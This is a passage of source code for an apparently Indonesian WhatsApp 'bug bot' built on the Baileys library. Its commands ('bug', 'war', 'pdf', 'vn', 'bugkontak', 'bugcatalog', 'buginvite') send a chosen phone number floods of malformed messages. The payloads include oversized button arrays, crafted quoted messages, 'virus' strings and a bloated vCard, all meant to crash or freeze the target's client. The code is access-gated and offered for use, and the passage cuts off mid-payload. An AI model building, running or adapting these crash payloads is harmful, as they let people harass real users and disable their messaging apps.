{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quoted: doc }
]})
}}
/*case 'santetdia': {
if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 6288xxx|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: rixx.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `FizzxMods`,
}
}}), { userJid: m.chat, quoted: doc})
rixx.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'bugstik':
case 'annuu':{
	thumb = fs.readFileSync("./baseikal/image/hw.jpg")
if (args.length < 1) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 628xx|5`)
num = q.split('|')[1]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
rixx.sendMessage(`${num}@s.whatsapp.net`, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
m.reply(`Done Tuan `)
}
break*/
case 'bug':
case 'bugfc':
case 'bugpc':
case 'sendbug':{
if (!q) return reply(`Contoh:\n${prefix+command} 628xxx`)
let ini_nomor_hpnya = q
rixx.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted: doc})
await sleep(20)
rixx.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted: doc})
await sleep(20)
rixx.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted: doc})
await sleep(20)
rixx.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted: doc})
await sleep(20)
rixx.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted: doc})
await sleep(20)
rixx.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted: doc})
await sleep(20)
rixx.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted: doc})
await sleep(20)
rixx.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted: doc})
await sleep(20)
rixx.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted: doc})
await sleep(20)
rixx.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted: doc})
await sleep(7000)
reply(`*Sukses mengirim bug for close ke nomor* :\nhttp://Wa.me/${ini_nomor_hpnya}`)
}
break
/*case 'bugstik':{
if (!itsMerixx) return m.reply(`Belum Di addakses`)
if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
const deploy = (teks) => {
  rixx.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: ppnyauser }}}}, {})
}
for (let i = 0; i < jumlah; i++) {
anjay(`Baiklah Tuan`)
/*if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Hafizz`
for (let i = 0; i < jumlah; i++) {
rixx.sendMessage(num, {sticker: ppnyauser},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
deploy(`Assalamualaikum`)
}
break*/
break
case 'war': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
	if (!text) return reply(`Contoh:\n${prefix+command} 628xxx`)
let q = `Mᴀᴍᴘᴜsʟᴜ\n${text}`
let sections = 
[
{
title: '  ⃢⃢  ⃢⃢  ⃢⃢  ⃢⃢  ⃢⃢  ⃢⃢  *꧁ᱝ✞☛͜⧼🥶⃟⚔w̆̈e̶ ă̈r̶e̶⧽͜🥵͜🔥☚✞ᱝ꧂* *重難重難重難重x難重難重難重難重重* *☛⧼͜🥶ꮗꮛ ꮢꮛ ꮑꮗꮥꮢ⧽͜👹🔥ᴷⁱⁿᵍ ʰᵘⁿᵗᵉʳ❗...༒⚞⚔n̷w̷s̷r̷࿐⚟༒...❗* *重難重難重難重難重難重難重難重重* *๑๑๑615๑๑* *๕๕๗๗๓๓๓๓* *๕๕๕๕๗๗๕๕*➳👹⚔᭄𝐍𝐖𝐒𝐑࿐🇱🇰☚༻*‼️💉💉🩸•𝚋𝚘𝚝𝚣•🩸💉💉‼️•☠•(༒⃟⃢❰❍❱•𝐗•➣⃟۝⃟°)•⁩☠•*.㍙.㍙.㍝.㍙.㍝.㍝.㍙.㍝.㍞.cc* *~.1.1.5.𫟅.▓.者.▓.1.5.5.𫟅.▓.8者.▓.𫟅.█.1.5.6.؋.cc~* �*.㍙.',
rows: [
{ title: '😈⛓𝑩𝒖𝒈 𝑷𝒅𝒇̶᭄࿐ꪶ😈', rowId: `pdf ${text}` },
{ title: '😈⛓𝑩𝒖𝒈 𝑪𝒂𝒕𝒂𝒐𝒄̶̶̶᭄࿐ꪶ😈', rowId: `bugcatalog ${text}` },
{ title: '😈⛓𝑩𝒖𝒈 𝑽𝒏̶᭄࿐ꪶ😈', rowId: `vn ${text}` },
{ title: '😈⛓𝑩𝒖𝒈 𝑺𝒕𝒊𝒄𝒌̶᭄࿐ꪶ😈', rowId: `sticker ${text}` },
{ title: '😈⛓𝑩𝒖𝒈 𝑰𝒎𝒈̶᭄࿐ꪶ😈', rowId: `bugimg ${text}` },
{ title: '😈⛓𝑩𝒖𝒈 𝑽𝒊𝒅𝒆𝒐̶᭄࿐ꪶ😈', rowId: `bugvid ${text}` },
 {title: '😈⛓𝑩𝒖𝒈 𝑰𝒏𝒗𝒊𝒕𝒆࿐ꪶ😈', rowId: `buginvite ${text}` },
{ title: '😈⛓𝑩𝒖𝒈 𝑪𝒓𝒂𝒔𝒉̶᭄࿐ꪶ😈', rowId: `bugcrash ${text}` },
{ title: '😈⛓𝑩𝒖𝒈 𝑲𝒐𝒏??𝒂𝒌̶᭄࿐ꪶ😈', rowId: `bugkontak ${text}` }, 
{ title: '😈⛓𝑩𝒖𝒈 𝑹𝒆𝒂𝒄𝒕𝑷𝒄̶᭄࿐ꪶ😈', rowId: `reactpc ${text}` },        
{ title: '😈⛓𝑩𝒖𝒈 𝑻𝒆𝒙𝒕 𝑪𝒓𝒂𝒔𝒉̶᭄࿐ꪶ😈', rowId: `bugtextcrash ${text}` },]}]
    let listMessage = {
      text: '😈⛓FizzxModss࿐ꪶ😈',
      footer: '*➳😈⛓⚔w̆̈e̶ FizzxModss࿐ꪶ😈💯',
      buttonText: '🥶⃟ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ  𝑫𝑺̶̶𝑰𝑵̶𝑰̶ 𝑺𝒕̶𝒂̶𝒉̶⧽̶̶͜🥵̶͜🔥̶',
      sections
      }
      const tegh = await rixx.sendMessage(m.chat, listMessage, { quoted: stckntl })
      }
      break
case 'vn': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
 rixx.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Vn Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'pdf': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
 rixx.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
await m.reply(`Berhasil Mengirim Bug Pdf Di Nomer ${text}@s.whatsapp.net`)
}
break
/*case 'sticker': {
let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.packname, global.author)
rixx.sendFile(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
}
break*/
case 'bugimg': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
rixx.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {image: thumb, bugimage }, {quoted: bugimage})
}
break
case 'bugcrash': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
/*rixx.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
rixx.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
rixx.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
rixx.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
rixx.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
rixx.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
await m.reply(`Berhasil Mengirim Bugcrash Di Nomer ${text}@s.whatsapp.net`)*/
m.reply(`Gagal Mengirim Bugcrash Di Nomor ${text}@s.whatsapp.net, Cobalah Menggunakan Bug Lain`)

}
break
case 'bugkontak': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
"contactMessage": {
"vcard": "HAHaAhHAHAHA",
"displayName": `${wmi}`,
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: fkontaak, contextInfo:{}}) 
rixx.relayWAMessage(res)
//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'reactpc': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
await rixx.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${wmi}` }, {quoted: trol})
//await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'bugtag': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
if (!isGroup) return m.reply(`Khusus Group Bang`)
rixx.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })
}
break
case 'bugcatalog': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
rixx.relayMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', catalog.message, { messageId: catalog.key.id })
}
break
case 'bugtextcrash': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
/*m.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${wm}`, main)*/
m.reply(`Gagal Mengirim Bugtextcrash Di Nomor ${text}@s.whatsapp.net, Cobalah Menggunakan Bug Lain`)

}
break
case 'bugvid': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
rixx.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {video: thumb, bugimage, }, {quoted: bugimage})
}
break
case 'buglist':{
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
sections = [
{
title: `Fixed\n${virus}`,
 rows: [
{title: virus, rowId: `Jembod`, description: `Hai \nAWGWG MAMPUS><`},
{title: virus2, rowId: `Jembod`, description: `Hai \nAWGWG MAMPUS><`},
{title: virus, rowId: `Jembod`, description: `Hai \nAWGWG MAMPUS><`}
]}]
let listMessage = {
      text: `Halo Bang\n${virus}`,
      footer: wm,
      buttonText: `🥶⃟ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ  Klick Ini Boz⧽̶̶͜🥵̶͜🔥\n-${virus2}̶`,
      sections
      }
rixx.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', listMessage, {quoted: fkontak})
/*
jobotz.sendListMsg(m.chat, `Script Di List\n${philips}`, jobotz.user.name, `THE JO BOT`, `THE JO BOT\n-${job`, des, shield2)*/
}
break
case 'buginvite': {
	if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
let farizcoli = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© THE JO BOT${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;rixx;;;\nFN:THE JO BOT\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 